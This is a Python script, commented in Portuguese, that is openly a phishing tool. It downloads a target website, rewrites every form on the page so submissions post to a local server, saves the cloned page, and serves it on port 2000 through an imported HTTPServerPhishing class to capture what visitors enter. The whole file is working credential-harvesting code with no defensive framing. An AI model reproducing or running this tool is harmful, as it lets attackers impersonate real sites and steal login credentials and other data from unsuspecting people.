from bs4 import BeautifulSoup
from urllib.request import urlopen
from servers.server import HTTPServerPhishing
import argparse
import sys
import signal

class PhishingServer:
    def __init__(self):
        self.__url = None
        self.__ip = None

    def setUrl(self, url):
        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url
        self.__url = url

    def setIP(self, ip):
        self.__ip = ip

    def getUrl(self):
        return self.__url

    def getIp(self):
        return self.__ip

    def checkStatus(self):
        try:
            result = urlopen(self.__url)
            return result.getcode() == 200
        except:
            print("[ERRO] Site não acessível")
            return False

    def saveHtml(self, html):
        with open('web/index.html', 'w', encoding='utf-8') as f:
            f.write(str(html))

    def runCloneSite(self):
        if not self.getUrl():
            print("[ERRO] URL não definida.")
            return
        if not self.checkStatus():
            print("[ERRO] Site offline ou inacessível.")
            return

        html = urlopen(self.getUrl()).read()
        content_inter = BeautifulSoup(html, 'lxml')

        # Altera todos os forms para POST e remove ação
        forms = content_inter.find_all('form')
        if forms:
            for tag in forms:
                tag['method'] = 'POST'
                tag['action'] = ''
        else:
            print("[AVISO] Nenhum formulário encontrado — site pode usar JS (SPA/2FA).")

        self.saveHtml(content_inter)

        # Corrigido: instanciando corretamente o servidor
        http = HTTPServerPhishing(self.getIp(), 2000, self.getUrl(), 'web/')
        http.run()

def signal_handler(sig, frame):
    print("\n[!] Encerrando servidor...")
    sys.exit(0)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="phishing - clone site e capture formulários")
    parser.add_argument('-u', '--url', dest='url', help='URL do site a ser clonado', required=True)
    parser.add_argument('-i', '--ip', dest='localip', help='IP do servidor local', default='0.0.0.0')
    args = parser.parse_args()

    phishing = PhishingServer()
    phishing.setUrl(args.url)
    phishing.setIP(args.localip)

    signal.signal(signal.SIGINT, signal_handler)
    phishing.runCloneSite()
    signal.pause()
